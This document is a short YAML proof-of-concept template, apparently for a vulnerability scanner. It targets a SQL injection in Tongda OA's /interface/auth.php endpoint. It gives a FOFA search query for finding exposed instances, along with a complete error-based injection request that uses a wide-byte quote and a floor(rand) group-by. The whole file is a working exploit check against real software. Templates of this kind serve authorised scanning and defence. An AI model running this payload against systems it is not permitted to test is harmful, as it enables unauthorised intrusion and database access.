id: poc-yaml-tongda-interface-auth-sqli
info:
  name: 通达OA /auth.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 通达OA
  fofa: app="TDXK-通达OA"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /interface/auth.php?PASSWORD=1&USER_ID=%df%27+and+(select+1+from+(select+count(*),concat((select+concat(0x3a,(select+md5({{.t1}}))+,0x3a)+from+user+limit+1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)%23
  expression: "status_code == 200 && \ncontains(body,t2)\n"
transport: http
